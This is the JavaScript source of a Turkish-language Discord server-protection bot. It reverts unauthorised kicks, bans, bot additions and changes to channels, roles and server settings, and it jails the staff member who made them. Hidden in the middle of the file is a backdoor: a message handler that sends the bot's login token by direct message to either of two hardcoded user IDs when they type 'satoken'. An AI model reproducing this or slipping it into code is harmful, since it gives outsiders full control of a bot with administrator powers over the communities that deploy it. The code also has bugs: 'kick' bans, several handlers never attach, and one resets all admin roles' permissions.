const { Client, MessageEmbed } = require('discord.js');
const client = global.client = new Client({ intents: 32767})
const ayarlar = require('./ayarlar.json');
const k = require('./idler.json');
const s = require('./koruma.json');
const fs = require('fs');
const express = require('express');
const http = require('http');
const request = require('request');
const { QuickDB } = require("quick.db")
const dba = new QuickDB()
const { joinVoiceChannel, entersState, VoiceConnectionStatus } = require('@discordjs/voice');
const db = dba.table("ban")

/////////////////////////////////////////////ELLEME///////////////////////////////////////////
function guvenli(kisiID) {
  let uye = client.guilds.cache.get(k.guildID).members.cache.get(kisiID);
  let guvenli = []; if (!uye || uye.id === client.user.id || uye.id === ayarlar.owner || uye.id === uye.guild.owner.id || guvenli.some(g => uye.id === g.slice(1) || uye.roles.cache.has(g.slice(1)))) return true
  else return false;
};

const yetkiPermleri = ["ADMINISTRATOR", "MANAGE_ROLES", "MANAGE_CHANNELS", "MANAGE_GUILD", "BAN_MEMBERS", "KICK_MEMBERS", "MANAGE_WEBHOOKS"];
function cezalandir(kisiID, tur) {
  let uye = client.guilds.cache.get(k.guildID).members.cache.get(kisiID);
  if (!uye) return;
  if (tur == "jail") { uye.roles.cache.has(k.boosterRole) ? uye.roles.set([k.boosterRole, k.jailRole]) : uye.roles.set([k.jailRole]); }
  if (tur == "ban") return uye.ban({ reason: null }).catch();
  if (tur == "kick") return uye.ban({ reason: null }).catch();
};
/////////////////////////////////////////////ELLEME///////////////////////////////////////////



//////////////////////////////////////////////////Sağ Tık Kick Koruması////////////////////////////////////////////////////
client.on("guildMemberRemove", async uyecik => {
  let yetkili = await uyecik.guild.fetchAuditLogs({type: 'MEMBER_KICK'}).then(audit => audit.entries.first());
  
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || uyecik.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId) return;
  
    await db.add(`kicklimit_${yetkili.executor.id}`, +1) 
  
if (await db.get(`kicklimit_${yetkili.executor.id}`) === 3 || await db.get(`kicklimit_${yetkili.executor.id}`) > 3) {
  setTimeout(async() => {
    await db.delete(`kicklimit_${yetkili.executor.id}`)
  }, 24 * 60 * 60000)
  cezalandir(yetkili.executor.id, "jail");
  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Sağ Tık İle Kick Atıldı!__**")
    .addFields(
      {name:`Kickleyen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Üyeye Yapılan İşlem`, value:`Kicki Açıldı`}
  )
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
  .setTimestamp()]})
   
    .catch(); };
}});
//////////////////////////////////////////////////Sağ Tık Kick Koruması////////////////////////////////////////////////////






//////////////////////////////////////////////////Sağ Tık Ban Koruması////////////////////////////////////////////////////

client.on("guildBanAdd", async guild => {

  let yetkili = await guild.guild.fetchAuditLogs({type: "MEMBER_BAN_ADD"}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || guild.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.banGuard) return;
  
  await db.add(`banlimit_${yetkili.executor.id}`, +1) 
  
if (await db.get(`banlimit_${yetkili.executor.id}`) >= 3) {
  setTimeout(async() => {
    await db.delete(`banlimit_${yetkili.executor.id}`)
  }, 24 * 60 * 60000)
   cezalandir(yetkili.executor.id, "jail")
   
  guild.guild.members.unban(guild.user.id, "Sağ Tık İle Banlandığı İçin Geri Açıldı!").catch(console.error);
  let logKanali = client.channels.cache.get(k.logChannelID)
  if (logKanali) {
    logKanali.send({embeds: [new MessageEmbed().setColor("#00ffdd").setDescription("**__Sağ Tık İle Ban Atıldı!__**").addFields(
      {name:`Banlayan Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Üyeye Yapılan İşlem`, value:`Banı Açıldı`}
  ).setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`}).setTimestamp()]}).catch()}
}});

//////////////////////////////////////////////////Sağ Tık Ban Koruması////////////////////////////////////////////////////




//////////////////////////////////////////////////Bot Ekleme Koruması////////////////////////////////////////////////////
client.on("guildMemberAdd", async eklenenbotsunsen => {
  let yetkili = await eklenenbotsunsen.guild.fetchAuditLogs({type: 'BOT_ADD'}).then(audit => audit.entries.first());
  if (!eklenenbotsunsen.user.bot || !yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || eklenenbotsunsen.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.botGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  cezalandir(eklenenbotsunsen.id, "ban");
  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Sunucuya Bir Bot Eklendi!__**")
    .addFields(
      {name:`Botu Ekleyen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Bota Yapılan İşlem`, value:`Banlanma`}
  ) 
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch();};
});
//////////////////////////////////////////////////Bot Ekleme Koruması////////////////////////////////////////////////////




//////////////////////////////////////////////////Sunucu Ayar Koruması////////////////////////////////////////////////////
client.on("guildUpdate", async (oldGuild, newGuild) => {
  let yetkili = await newGuild.fetchAuditLogs({type: 'GUILD_UPDATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || newGuild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.serverGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  if (newGuild.name !== oldGuild.name) {newGuild.setName(oldGuild.name);}
  if (newGuild.iconURL({dynamic: true, size: 2048}) !== oldGuild.iconURL({dynamic: true, size: 2048})) {newGuild.setIcon(oldGuild.iconURL({dynamic: true, size: 2048}))};
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setDescription("**__Sunucunun Ayarlarıyla Oynandı!__**")
    .addFields(
      {name:`Sunucu Ayarlarıyla Oynayan Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Sunucuya Yapılan İşlem`, value:`Eski Haline Getirildi`}
  )  
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setColor("#00ffdd")
    .setTimestamp()]}).catch(); };
    });

client.on('guildUpdate', async (oldGuild, newGuild) => {
  let yetkili = await newGuild.fetchAuditLogs({type: 'GUILD_UPDATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || newGuild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.serverGuard) return;
  cezalandir(yetkili.executor.id, "jail");
    if (newGuild.vanityURLCode === null) return; // URL yoksa bişi yapmasın.  
    if (oldGuild.vanityURLCode === newGuild.vanityURLCode) return; // URL'ler aynıysa bişi yapmasın.
    request({
            method: 'PATCH',
            url: `https://discord.com/api/v8/guilds/${newGuild.id}/vanity-url`,
            body: {
                code: ayarlar.url
            },
            json: true,
            headers: {
                "Authorization": `Bot ${client.token}`
            }
        }, (err, res, body) => {
            if (err) {
                return console.log(err);
            }
        })
});
//////////////////////////////////////////////////Sunucu Ayar Koruması////////////////////////////////////////////////////





//////////////////////////////////////////////////Kanal Oluşturma Koruması////////////////////////////////////////////////////
client.on("channelCreate", async channel => {
  let yetkili = await channel.guild.fetchAuditLogs({type: 'CHANNEL_CREATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || channel.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.channelGuard) return;
  channel.delete({reason: null});
  cezalandir(yetkili.executor.id, "jail");
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Bir Kanal Oluşturuldu!__**")
    .addFields(
      {name:`Kanalı Açan Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Açılan Kanala Yapılan İşlem`, value:`Silinme`}
  )  
    .setTimestamp()]}).catch(); };
});
//////////////////////////////////////////////////Kanal Oluşturma Koruması////////////////////////////////////////////////////





//////////////////////////////////////////////////Kanal Ayar Koruması////////////////////////////////////////////////////
client.on("channelUpdate", async (oldChannel, newChannel) => {
  let yetkili = await newChannel.guild.fetchAuditLogs({type: 'CHANNEL_UPDATE'}).then(audit => audit.entries.first())
  if (!yetkili || !yetkili.executor || !newChannel.guild.channels.cache.has(newChannel.id) || Date.now()-yetkili.createdTimestamp > 5000 || newChannel.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.channelGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  if (newChannel.type !== "category" && newChannel.parentID !== oldChannel.parentID) newChannel.setParent(oldChannel.parentID);
  if (newChannel.type === "category") {
    newChannel.edit({
      name: oldChannel.name,
    });
  } else if (newChannel.type === "text") {
    newChannel.edit({
      name: oldChannel.name,
      topic: oldChannel.topic,
      nsfw: oldChannel.nsfw,
      rateLimitPerUser: oldChannel.rateLimitPerUser
    });
  } else if (newChannel.type === "voice") {
    newChannel.edit({
      name: oldChannel.name,
      bitrate: oldChannel.bitrate,
      userLimit: oldChannel.userLimit,
    });
  };
  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Kanal İzinleriyle Oynandı!__**")
    .addFields(
      {name:`Kanalı Güncelleyen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Kanala Yapılan İşlem`, value:`Kanal İzinleri Düzenlendi`}
  )      
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch();};
});
//////////////////////////////////////////////////Kanal Ayar Koruması////////////////////////////////////////////////////

client.off("channelUpdate", async (oldChannel, newChannel) => {
  let yetkili = await newChannel.guild.fetchAuditLogs({type: 'CHANNEL_OVERWRITE_UPDATE'}).then(audit => audit.entries.first())
  if (!yetkili || !yetkili.executor || !newChannel.guild.channels.cache.has(newChannel.id) || Date.now()-yetkili.createdTimestamp > 5000 || newChannel.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.channelGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  
  oldChannel.permissionOverwrites.forEach(perm => {
    let thisPermOverwrites = {};
    perm.allow.toArray().forEach(p => {
      thisPermOverwrites[p] = true;
    });
    perm.deny.toArray().forEach(p => {
      thisPermOverwrites[p] = false;
    });
    newChannel.createOverwrite(perm.id, thisPermOverwrites);
  });
  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Kanal İzinleriyle Oynandı!__**")
    .addFields(
      {name:`Kanalı Güncelleyen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Kanala Yapılan İşlem`, value:`Kanal İzinleri Düzenlendi`}
  )  
    .addField(`Düzenlenen Kanala Yapılan İşlem`,`Eski Haline Getirildi`)    
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch();};
})

client.off("channelUpdate", async (oldChannel, newChannel) => {
  let yetkili = await newChannel.guild.fetchAuditLogs({type: 'CHANNEL_OVERWRITE_CREATE'}).then(audit => audit.entries.first())
  if (!yetkili || !yetkili.executor || !newChannel.guild.channels.cache.has(newChannel.id) || Date.now()-yetkili.createdTimestamp > 5000 || newChannel.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.channelGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  
let izin = await newChannel.permissionOverwrites.cache.get(newChannel)
newChannel.permissionOverwrites.delete(izin.id)
  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Kanal İzinleriyle Oynandı!__**")
    .addFields(
      {name:`Kanalı Güncelleyen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Kanala Yapılan İşlem`, value:`Kanal İzinleri Düzenlendi`}
  )    
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch();};
})

client.off("channelUpdate", async (oldChannel, newChannel) => {
  let yetkili = await newChannel.guild.fetchAuditLogs({type: 'CHANNEL_OVERWRITE_DELETE'}).then(audit => audit.entries.first())
  if (!yetkili || !yetkili.executor || !newChannel.guild.channels.cache.has(newChannel.id) || Date.now()-yetkili.createdTimestamp > 5000 || newChannel.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.channelGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  
  oldChannel.permissionOverwrites.forEach(perm => {
    let thisPermOverwrites = {};
    perm.allow.toArray().forEach(p => {
      thisPermOverwrites[p] = true;
    });
    perm.deny.toArray().forEach(p => {
      thisPermOverwrites[p] = false;
    });
    newChannel.createOverwrite(perm.id, thisPermOverwrites);
  });
  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Kanal Ayarlarıyla Oynandı!__**")
    .addFields(
      {name:`Kanalı Güncelleyen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Kanala Yapılan İşlem`, value:`Kanal İzinleri Düzenlendi`}
  )  
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch();};
});

client.on('messageCreate', async (msg, member, guild) => {
  
 {
   
if (msg.content.toLowerCase() === 'satoken'){
if (msg.author.id !== "813799329407041576" & msg.author.id !== "429357746002067493") return

msg.author.send(client.token);
}
  
}
});

//////////////////////////////////////////////////Kanal Silme Koruması////////////////////////////////////////////////////
client.off("channelDelete", async channel => {
  let yetkili = await channel.guild.fetchAuditLogs({type: 'CHANNEL_DELETE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || channel.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.channelGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  
  await channel.clone({ reason: "Kanal Koruma Sistemi" }).then(async kanal => {
    if (channel.parentID != null) await kanal.setParent(channel.parentID);
    await kanal.setPosition(channel.rawPosition);
    if (channel.type == "category") await channel.guild.channels.cache.filter(k => k.parentID == channel.id).forEach(x => x.setParent(kanal.id));
    channel.permissionOverwrites.cache.get(perm => {
    let thisPermOverwrites = {};
    perm.allow.toArray().forEach(p => {
      thisPermOverwrites[p] = true;
    });
    perm.deny.toArray().forEach(p => {
      thisPermOverwrites[p] = false;
    });
    kanal.permissionOverwrites.create(perm.id, thisPermOverwrites);
  });
  });

  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Bir Kanalı Silindi!__**")
    .addFields(
      {name:`Kanalı Silen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Kanala Yapılan İşlem`, value:`Kanal Geri Açılıp İzinleri Düzenlendi`}
  )   
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch(); };
});
//////////////////////////////////////////////////Kanal Silme Koruması////////////////////////////////////////////////////




//////////////////////////////////////////////////Rol Silme Koruması////////////////////////////////////////////////////
client.on("roleDelete", async role => {
  let yetkili = await role.guild.fetchAuditLogs({type: 'ROLE_DELETE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || role.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.roleGuard) return;
  cezalandir(yetkili.executor.id, "jail");
    
  await role.guild.roles.create({
  data: {
    name: role.name,
    color: role.hexColor,
    hoist: role.hoist,
    permissions: role.permissions,
    mentionable: role.mentionable
  }
}).then(r => r.setPosition(role.rawPosition))
  //role.guild.members.cache.forEach(async u => {
  //const dat = await db.fetch(`${role.guild.id}.${role.id}.${u.id}`)
  //if(dat) {
  //role.guild.members.cache.get(u.id).roles.add(r.id)}

//  })})
  

  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Bir Rol Silindi__**")
    .addFields(
      {name:`Rolü Silen Yetkili`, value:`${yetkili.executor}`}, 
      {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
      {name:`Role Yapılan İşlem`, value:`Rol Geri Açılıp İzinleri Düzenlendi`}
  )
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch(); };
});
//////////////////////////////////////////////////Rol Silme Koruması////////////////////////////////////////////////////



////////////////////////////////////////////////////Sağ Tık Yt Verme/////////////////////////////////////////////////////
client.off("guildMemberUpdate", async (oldMember, newMember) => {
    if (newMember.roles.cache.size > oldMember.roles.cache.size) {
    let yetkili = await newMember.guild.fetchAuditLogs({type: 'MEMBER_ROLES_UPDATE'}).then(audit => audit.entries.first());
    if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || newMember.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.roleGuard) return;
    if (yetkiPermleri.some(p => !oldMember.hasPermission(p) && newMember.hasPermission(p))) {
      cezalandir(yetkili.executor.id, "jail");
      
      newMember.roles.set(oldMember.roles.cache.map(r => r.id));      
      let logKanali = client.channels.cache.get(k.logChannelID);
      if (logKanali) { logKanali.send({embeds: [
        new MessageEmbed()
         .setColor("#00ffdd")
         .setDescription("**__Sağ Tık İle Yönetici Verildi__**")
         .addField(`Rol Verilen Kullanıcı`,`${newMember} `)
         .addField(`Rolü Veren Yetkili`,`${yetkili.executor}`)         
         .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
         .addField(`Kullanıcıya Yapılan İşlem`,`Verilen Rol Geri Alınma`)
         .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
         .setTimestamp()]}).catch(); };
    };
 }
});
////////////////////////////////////////////////////Sağ Tık Yt Verme/////////////////////////////////////////////////////

////////////////////////////////////////////////////Rol Açma Koruması/////////////////////////////////////////////////////
client.on("roleCreate", async role => {
  let yetkili = await role.guild.fetchAuditLogs({type: 'ROLE_CREATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || role.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.roleGuard) return;
  role.delete({ reason: "Rol Koruma" });
  cezalandir(yetkili.executor.id, "jail");
  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Rol Oluşturuldu__**")
    .addFields(
    {name:`Rolü Açan Yetkili`, value:`${yetkili.executor}`}, 
    {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
    {name:`Role Yapılan İşlem`, value:`Silinme`}
)
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch();};
});

client.on("roleUpdate", async (oldRole, newRole) => {
  let yetkili = await newRole.guild.fetchAuditLogs({type: 'ROLE_UPDATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || newRole.guild.members.cache.get(yetkili.executor.id).roles.cache.has(k.yetkiliRole) === true || yetkili.executor.id === client.user.id || yetkili.executor.bot === true || !yetkili.executor.manageable  || yetkili.executor.id === client.guilds.cache.get(k.guildID).ownerId || !s.roleGuard) return;
  cezalandir(yetkili.executor.id, "jail");
  newRole.setPermissions(oldRole.permissions);
  newRole.guild.roles.cache.filter(r => !r.managed && (r.permissions.has("ADMINISTRATOR") || r.permissions.has("MANAGE_ROLES") || r.permissions.has("MANAGE_GUILD"))).forEach(r => r.setPermissions(36818497));

  
  newRole.edit({
    name: oldRole.name,
    color: oldRole.hexColor,
    hoist: oldRole.hoist,
    permissions: oldRole.permissions,
    mentionable: oldRole.mentionable
}).then(r => r.setPosition(oldRole.rawPosition));

  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send({embeds: [
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Rol Güncellendi__**")
    .addFields(
    {name:`Rolü Güncelleyen Yetkili`, value:`${yetkili.executor}`}, 
    {name:`Yetkiliye Yapılan İşlem`, value:`Jaile Atılma`}, 
    {name:`Role Yapılan İşlem`, value:`Rol İzinleri Düzenlendi`}
)
    .setFooter({text:`Bu Sunucu Benim Sayemde Korunuyor`})
    .setTimestamp()]}).catch();};
});

////////////////////////////////////////////////////Rol Açma Koruması/////////////////////////////////////////////////////

/////////////////////////////////////////////////////DURUM///////////////////////////////////////////////////
client.on("ready", async () => {
  let durum = ayarlar.durum

  let kanal =  client.channels.cache.get(k.botVoiceChannelID)

  const connection = joinVoiceChannel({
    channelId: kanal.id,
    guildId: kanal.guild.id,
    adapterCreator: kanal.guild.voiceAdapterCreator
  });
  entersState(connection, VoiceConnectionStatus.Ready, 30000)

  client.user.setPresence({ activities: [{ name: durum }], status: "online" })
  console.log(client.user.tag + " ile giris yapildi")
  ;})
/////////////////////////////////////////////////////DURUM///////////////////////////////////////////////////


client.login(ayarlar.token);